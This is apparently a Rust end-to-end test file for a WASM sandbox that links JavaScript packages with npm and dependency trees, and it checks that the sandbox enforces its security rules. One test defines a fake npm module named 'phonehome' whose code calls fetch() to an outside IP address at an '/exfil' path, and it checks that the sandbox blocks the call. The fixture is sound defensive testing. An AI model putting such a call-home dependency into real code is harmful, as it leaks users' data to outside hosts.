// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2026 vertexclique
// Licensed under the Business Source License 1.1.
// Change Date: 10 years after this version's release. Change License: Apache-2.0.

//! Linked packages e2e - the virtual-filesystem composition
//! (`Afb::linked_source`) running through the REAL engine invoke path
//! (`register` + `run`, the same path an embedder's `burn.invoke` rides).
//!
//! Cargo model: the `.afb` carries only the package's OWN source. afb
//! dependency packages and npm packages are resolved + cached separately
//! (by `burn install`) and handed to `linked_source` at load time, which
//! mounts them into the virtual tree.
//!
//! Proves, against the live sandbox:
//!  * multi-file packages: `require('./sibling')` within the package;
//!  * npm packages: bare `require('pkg')` resolved from a npm tree mounted
//!    at virtual `node_modules` (NOT packed in the .afb);
//!  * dependency packages: bare `require('ns/dep')` resolved through
//!    `__afb_links` to a digest-pinned dependency under `/afb/burn_modules`;
//!  * SECURITY: composed code runs under the ROOT manifold - network from
//!    an npm dep is DENIED when the manifold grants none; a native artifact
//!    in a resolved npm tree is rejected; a virtual miss is MODULE_NOT_FOUND
//!    (never a host-fs EACCES - `/afb/…` never reaches the fs bridge).

use afterburner::{Afterburner, FsAccess, Manifold};
use afterburner_afb::pack::Builder;
use afterburner_afb::{Afb, AfbError, Manifest, hex};
use serde_json::json;
use std::collections::BTreeMap;

fn manifest(ns: &str, name: &str, deps: &[(&str, &Afb)]) -> Manifest {
    let mut toml = format!(
        "[format]\nversion = \"1.0\"\n[package]\nname = \"{name}\"\nnamespace = \"{ns}\"\n\
         version = \"0.1.0\"\nlanguage = \"javascript\"\nentry = \"source/main.js\"\n\
         [runtime]\nmin = \"0.1.0\"\n"
    );
    if !deps.is_empty() {
        toml.push_str("[dependencies]\n");
        for (coord, afb) in deps {
            toml.push_str(&format!("\"{coord}\" = \"sha256:{}\"\n", hex(&afb.digest)));
        }
    }
    Manifest::parse(&toml).expect("manifest parses")
}

fn pack(ns: &str, name: &str, files: &[(&str, &str)], deps: &[(&str, &Afb)]) -> Afb {
    let mut b = Builder::new(manifest(ns, name, deps), Manifold::default());
    for (p, c) in files {
        b = b.source(*p, c.as_bytes().to_vec());
    }
    let (bytes, _) = b.build().expect("pack");
    Afb::from_bytes(&bytes).expect("unpack")
}

/// A resolved npm package tree (as `burn install` would cache it), keys
/// package-root-relative.
fn npm_tree(files: &[(&str, &str)]) -> BTreeMap<String, Vec<u8>> {
    files
        .iter()
        .map(|(p, c)| ((*p).to_string(), c.as_bytes().to_vec()))
        .collect()
}

const LEFTPAD: &[(&str, &str)] = &[
    (
        "package.json",
        "{ \"name\": \"leftpad\", \"version\": \"1.0.0\", \"main\": \"index.js\" }",
    ),
    (
        "index.js",
        "module.exports = function (s, n) { s = String(s); while (s.length < n) s = '0' + s; return s; };",
    ),
];

fn sealed_engine() -> Afterburner {
    Afterburner::builder()
        .manifold(Manifold {
            fs: FsAccess::None,
            ..Manifold::sealed()
        })
        .build()
        .expect("engine")
}

#[test]
fn multi_file_package_requires_siblings() {
    let afb = pack(
        "t",
        "multi",
        &[
            (
                "source/main.js",
                "const util = require('./util');\nmodule.exports = (d) => util.add(d.a, d.b);",
            ),
            (
                "source/util.js",
                "module.exports = { add: (a, b) => a + b };",
            ),
        ],
        &[],
    );
    assert!(afb.needs_linking());
    let src = afb.linked_source(&[], &[]).expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({ "a": 19, "b": 23 })).expect("run");
    assert_eq!(out, json!(42));
}

#[test]
fn npm_package_resolves_from_resolved_tree() {
    // The .afb declares the npm dep; it is NOT packed. The resolved tree
    // is supplied at link time (as `burn install` would from its cache).
    let afb = pack(
        "t",
        "vendored",
        &[(
            "source/main.js",
            "const pad = require('leftpad');\nmodule.exports = (d) => pad(d.s, d.n);",
        )],
        &[],
    );
    assert!(!afb.source.keys().any(|k| k.contains("node_modules")));
    let tree = npm_tree(LEFTPAD);
    let src = afb
        .linked_source(&[], &[("leftpad", &tree)])
        .expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({ "s": "7", "n": 4 })).expect("run");
    assert_eq!(out, json!("0007"));
}

#[test]
fn dependency_package_links_by_coordinate() {
    let dep = pack(
        "t",
        "mathdep",
        &[(
            "source/main.js",
            "module.exports = { double: (x) => x * 2 };",
        )],
        &[],
    );
    let root = pack(
        "t",
        "root",
        &[(
            "source/main.js",
            "const m = require('t/mathdep');\nmodule.exports = (d) => m.double(d.x);",
        )],
        &[("t/mathdep", &dep)],
    );
    let src = root
        .linked_source(&[("t/mathdep", &dep)], &[])
        .expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({ "x": 21 })).expect("run");
    assert_eq!(out, json!(42));
}

#[test]
fn npm_network_is_denied_under_sealed_manifold() {
    // An npm dep tries to reach the network. The root package grants
    // nothing - the attempt must surface as a denial. Capability gates
    // apply to dependency code exactly as to first-party code.
    let afb = pack(
        "t",
        "sneaky",
        &[(
            "source/main.js",
            "const phone = require('phonehome');\nmodule.exports = async (d) => {\n\
               try { await phone(); return 'reached-network'; }\n\
               catch (e) { return 'denied:' + (e && e.message ? String(e.message).slice(0, 40) : 'unknown'); }\n\
             };",
        )],
        &[],
    );
    let tree = npm_tree(&[
        (
            "package.json",
            "{ \"name\": \"phonehome\", \"version\": \"1.0.0\", \"main\": \"index.js\" }",
        ),
        (
            "index.js",
            "module.exports = function () { return fetch('http://93.184.216.34/exfil'); };",
        ),
    ]);
    let src = afb
        .linked_source(&[], &[("phonehome", &tree)])
        .expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({})).expect("run completes");
    let s = out.as_str().expect("string verdict");
    assert!(
        s.starts_with("denied:"),
        "npm-dep network attempt must be denied, got: {s}"
    );
}

#[test]
fn native_artifact_in_npm_tree_is_rejected_at_link() {
    // A resolved npm tree carrying a native addon must fail composition -
    // the WASM sandbox can never load it (defense at link time, in case
    // install-time rejection were ever bypassed).
    let afb = pack(
        "t",
        "withnative",
        &[("source/main.js", "module.exports = () => 1;")],
        &[],
    );
    let mut tree = npm_tree(&[
        ("package.json", "{ \"name\": \"bcrypt\" }"),
        ("index.js", "module.exports = 1;"),
    ]);
    tree.insert("build/Release/bcrypt.node".into(), b"\0\0native".to_vec());
    let err = afb.linked_source(&[], &[("bcrypt", &tree)]).unwrap_err();
    assert!(
        matches!(err, AfbError::NativeAddon { .. }),
        "native npm artifact must be rejected"
    );
}

#[test]
fn virtual_miss_is_module_not_found_not_eacces() {
    // A miss inside the virtual tree must NOT consult the host fs (which
    // is fully denied here) - the error is Node's MODULE_NOT_FOUND, not a
    // manifold EACCES. Proves '/afb/…' paths never cross the fs bridge.
    let afb = pack(
        "t",
        "misser",
        &[
            (
                "source/main.js",
                "module.exports = () => {\n\
                   try { require('./does-not-exist'); return 'loaded'; }\n\
                   catch (e) { return e.code || 'no-code'; }\n\
                 };",
            ),
            ("source/extra.js", "module.exports = 0;"),
        ],
        &[],
    );
    let src = afb.linked_source(&[], &[]).expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({})).expect("run");
    assert_eq!(out, json!("MODULE_NOT_FOUND"));
}

// TypeScript burn package importing an npm package. TS is a BUILD-TIME
// concern: `burn package` transpiles `.ts` -> `.js` so the published
// `.afb` is always plain JS (the runtime sandbox needs no transpiler,
// exactly like npm packages that ship compiled JS). This exercises that
// real flow: author TS that requires npm -> transpile (the same
// `afterburner::ts::transpile` the CLI uses) -> pack JS -> npm resolves.
#[cfg(feature = "ts")]
#[test]
fn typescript_source_transpiles_then_imports_npm() {
    use std::path::Path;
    let ts_src = "const pad = require('leftpad');\n\
                  const f = (d: { s: string; n: number }): string => pad(d.s, d.n);\n\
                  module.exports = f;";
    let js_src = afterburner::ts::transpile(ts_src, Path::new("source/main.ts"))
        .expect("transpile TS -> JS");
    // packed package ships the transpiled JS as its entry
    let afb = pack("t", "tsuser", &[("source/main.js", js_src.as_str())], &[]);
    let tree = npm_tree(LEFTPAD);
    let src = afb
        .linked_source(&[], &[("leftpad", &tree)])
        .expect("linked");
    let ab = sealed_engine();
    let id = ab.register(&src).expect("register");
    let out = ab.run(&id, &json!({ "s": "5", "n": 3 })).expect("run");
    assert_eq!(out, json!("005"));
}
